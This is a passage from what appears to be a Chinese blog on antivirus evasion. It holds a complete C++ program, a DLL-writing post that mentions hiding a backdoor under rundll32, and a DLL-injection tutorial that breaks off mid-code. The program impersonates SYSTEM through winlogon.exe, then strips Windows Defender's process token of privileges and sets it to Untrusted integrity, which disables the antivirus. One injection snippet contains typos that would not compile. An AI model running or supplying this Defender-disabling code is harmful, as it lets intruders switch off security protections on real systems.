class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">EnableDebugPrivilege</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID sedebugnameValue;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getpid</span><span class="params">(LPCWSTR procname)</span> &#123;</span><br><span class="line">    DWORD procPID = <span class="number">0</span>;</span><br><span class="line">    LPCWSTR processName = <span class="string">L&quot;&quot;</span>;</span><br><span class="line">    PROCESSENTRY32 processEntry = &#123;&#125;;</span><br><span class="line">    processEntry.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);</span><br><span class="line">    <span class="keyword">if</span> (Process32First(snapshot, &amp;processEntry))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (_wcsicmp(processName, procname) != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        Process32Next(snapshot, &amp;processEntry);</span><br><span class="line">        processName = processEntry.szExeFile;</span><br><span class="line">        procPID = processEntry.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Got %ls PID: %d\n&quot;</span>, procname, procPID);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> procPID;</span><br><span class="line">    &#125;</span><br><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE hToken, <span class="comment">// access token handle</span></span></span><br><span class="line"><span class="params">LPCTSTR lpszPrivilege, <span class="comment">// name of privilege to enable/disable</span></span></span><br><span class="line"><span class="params">BOOL bEnablePrivilege <span class="comment">// to enable or disable privilege</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">LUID luid;</span><br><span class="line"><span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, <span class="comment">// lookup privilege on local system</span></span><br><span class="line">lpszPrivilege, <span class="comment">// privilege to lookup</span></span><br><span class="line">&amp;luid)) <span class="comment">// receives LUID of privilege</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line"><span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line"><span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,FALSE,&amp;tp,<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,(PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">LUID sedebugnameValue;</span><br><span class="line">EnableDebugPrivilege();</span><br><span class="line"><span class="type">wchar_t</span> procname[<span class="number">80</span>] = <span class="string">L&quot;winlogon.exe&quot;</span>;</span><br><span class="line"><span class="type">int</span> pid = getpid(procname);</span><br><span class="line">HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">HANDLE ptoken;</span><br><span class="line">OpenProcessToken(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE,&amp;ptoken);</span><br><span class="line"><span class="keyword">if</span> (ImpersonateLoggedOnUser(ptoken)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Impersonated System!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to impersonate System...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(phandle);</span><br><span class="line">CloseHandle(ptoken);</span><br><span class="line"><span class="type">wchar_t</span> procname2[<span class="number">80</span>] = <span class="string">L&quot;MsMpEng.exe&quot;</span>;</span><br><span class="line">pid = getpid(procname2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Bypass Defender...\n&quot;</span>);</span><br><span class="line">phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (phandle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Process Handle:%d\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line">BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &amp;ptoken);</span><br><span class="line"><span class="keyword">if</span> (token) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Token Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Target Token Handle : %d\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line">LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue);</span><br><span class="line">TOKEN_PRIVILEGES tkp;</span><br><span class="line">tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (!AdjustTokenPrivileges(ptoken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to Adjust Token&#x27;s Privileges\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_TCB_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Removed All Privileges\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;</span><br><span class="line">SID integrityLevelSid&#123;&#125;;</span><br><span class="line">integrityLevelSid.Revision = SID_REVISION;</span><br><span class="line">integrityLevelSid.SubAuthorityCount = <span class="number">1</span>;</span><br><span class="line">integrityLevelSid.IdentifierAuthority.Value[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">integrityLevelSid.SubAuthority[<span class="number">0</span>] = integrityLevel;</span><br><span class="line">    </span><br><span class="line">TOKEN_MANDATORY_LABEL tokenIntegrityLevel = &#123;&#125;;</span><br><span class="line">tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;</span><br><span class="line">tokenIntegrityLevel.Label.Sid = &amp;integrityLevelSid;</span><br><span class="line"><span class="keyword">if</span> (!SetTokenInformation(ptoken,TokenIntegrityLevel,&amp;tokenIntegrityLevel,<span class="keyword">sizeof</span>(TOKEN_MANDATORY_LABEL) + GetLengthSid(&amp;integrityLevelSid)))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;SetTokenInformation failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Token Integrity set to Untrusted\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(ptoken);</span><br><span class="line">CloseHandle(phandle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/PPL%20Attack/" data-id="cm1zwlrfl0007u0v66t1d8lyw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/Dll编写" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Dll%E7%BC%96%E5%86%99/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.555Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Dll编写"><a href="#Dll编写" class="headerlink" title="Dll编写"></a>Dll编写</h1><p>DLL的全称是Dynamic Link Library，中文叫做“动态链接文件”，在Windows操作系统中，DLL对于程序</p>
<p>执行是非常重要的，因为程序在执行的时候，必须链接到DLL文件，才能够正确地运行。DLL的全称是Dynamic Link Library，中文叫做“动态链接文件”</p>
<p>在Windows操作系统中，DLL对于程序执行是非常重要的，因为程序在执行的时候，必须链接到DLL文件, 才能够正确地运行。而有些DLL文件可以被许多程序共用。因此，程序设计人员可以利用DLL文件，使程序不至于太过巨大</p>
<p>vs生成dll， DllMain 的形式其调用流程如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.程序调用Windows API LoadLibrary</span><br><span class="line">2.操作系统寻找LoadLibrary所加载的DLL文件</span><br><span class="line">3.操作系统将DLL文件加载至目标程序进程的内存空间</span><br><span class="line">4.程序自动调用 DllMain函数</span><br><span class="line">5.程序调用DLL中导出函数</span><br></pre></td></tr></table></figure>

<p>DllMain函数成员作用如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_ HINSTANCE hinstDLL, <span class="comment">// 指向自身的句柄</span></span></span><br><span class="line"><span class="params">_In_ DWORD fdwReason, <span class="comment">// 调用原因</span></span></span><br><span class="line"><span class="params">_In_ LPVOID lpvReserved <span class="comment">// 隐式加载和显式加载</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>其中fdwReason用来表示DLL被调用的状态，一共分为四种：</p>
<ul>
<li>DLL_PROCESS_ATTACH 被进程加载</li>
<li>DLL_PROCESS_DETACH 被进程释放</li>
<li>DLL_THREAD_ATTACH 被线程加载</li>
<li>DLL_THREAD_DETACH 被线程释放</li>
</ul>
<p>Rundll32.exe 用来执行32位的DLL文件。它的作用是执行DLL文件中的内部函数，这样在进程当中，只会有 Rundll32.exe ，而不会有DLL后门的进程，这样，就实现了进程上的隐藏。虽然说不会产生额外的进程，但是如果<strong>遍历 rundll32.exe 的模块还是能够发现进程加载的dll rundll32.exe</strong> 支持的函数原型如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID CALLBACK <span class="title">FunctionName</span> <span class="params">(HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT</span></span></span><br><span class="line"><span class="params"><span class="function">nCmdShow)</span></span>;</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">void</span> <span class="title function_">rundll</span><span class="params">(HWND hwnd,HINSTANCE hinst,LPTSTR</span></span><br><span class="line"><span class="params">lpCmdLine,INT nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>,TEXT(<span class="string">&quot;Test&quot;</span>),TEXT(<span class="string">&quot;Rundll32&quot;</span>),MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/Dll%E7%BC%96%E5%86%99/" data-id="cm1zwlrfl0006u0v69n8z0mjd" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/Dll注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Dll%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.554Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Dll注入"><a href="#Dll注入" class="headerlink" title="Dll注入"></a>Dll注入</h1><h2 id="关键API"><a href="#关键API" class="headerlink" title="关键API"></a>关键API</h2><h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在DLL注入的时候，起的是远程的线程</p>
<p>在上面的参数中，lpStartAddress就是线程的函数，使用LoadLibrary的地址作为线程函数的地址，这样我们就可以用LoadLibrary来起lpParameter中装载的dll路径</p>
<h2 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h2><p>这个函数是在指定进程的虚拟空间中保留或者提交内存区域，除非指定MEM_RESET参数，否则将该内存区域置0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID <span class="title function_">VirtualAllocEx</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE hProcess,</span></span><br><span class="line"><span class="params">LPVOID lpAddress,</span></span><br><span class="line"><span class="params">SIZE_T dwSize,</span></span><br><span class="line"><span class="params">DWORD flAllocationType,</span></span><br><span class="line"><span class="params">DWORD flProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<h2 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h2><p>此函数能够写入后一个进程的内存区域（但是直接写入会存在Access Violation错误),故需要此函数入口必修可以访问，否则操作将失败。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">WriteProcessMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE hProcess, <span class="comment">//进程句柄</span></span></span><br><span class="line"><span class="params">LPVOID lpBaseAddress, <span class="comment">//写入的内存首地址</span></span></span><br><span class="line"><span class="params">LPCVOID lpBuffer, <span class="comment">//要写数据的指针</span></span></span><br><span class="line"><span class="params">SIZE_T nSize, <span class="comment">//x</span></span></span><br><span class="line"><span class="params">SIZE_T *lpNumberOfBytesWritten</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.在进程中开辟一段空间</span><br><span class="line">2.存入dll绝对路径地址的字符串</span><br><span class="line">3.使用RemoteCreateThread函数带起LoadLibrary函数带起dll</span><br></pre></td></tr></table></figure>

<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="获取句柄"><a href="#获取句柄" class="headerlink" title="获取句柄"></a>获取句柄</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetProcessPID</span><span class="params">(LPCTSTR lpProcessName)</span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD Ret = <span class="number">0</span>;</span><br><span class="line">PROCESSENTRY32 p32;</span><br><span class="line"></span><br><span class="line">HANDLE lpSnapshot = ::CreateToolhelp32Snampshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lpSnashot == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;GetSnapshotError:%d&quot;</span>,::GetLastError());</span><br><span class="line">	<span class="keyword">return</span> Ret;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//获取进程快照成功之后,将快照存储到PROCESSENTRY32的结构里面</span></span><br><span class="line">  p32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">  ::Process32First(lpSnapshot,&amp;p32);</span><br><span class="line">  <span class="comment">//遍历快照,找到指定进程名的进程号</span></span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!lstrcmp(p32.szExeFile,lpProcessName))&#123;</span><br><span class="line">		  Ret = p32.th32ProcessID;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="keyword">while</span>(::Process32Next(lpSnapshot,&amp;p32));</span><br><span class="line">  </span><br><span class="line">  ::CloseHandle(lpSnapshot);</span><br><span class="line">  <span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">GetProcessPID</span><span class="params">(LPCTSTR lpProcessName)</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD Ret = <span class="number">0</span>;</span><br><span class="line">PROCESSENTRY32 p32;</span><br><span class="line">HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (lpSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetSnapshotError:%d&quot;</span>,::GetLastError());</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line">p32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">::Process32First(lpSnapshot, &amp;p32);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!lstrcmp(p32.szExeFile, lpProcessName))</span><br><span class="line">&#123;</span><br><span class="line">Ret = 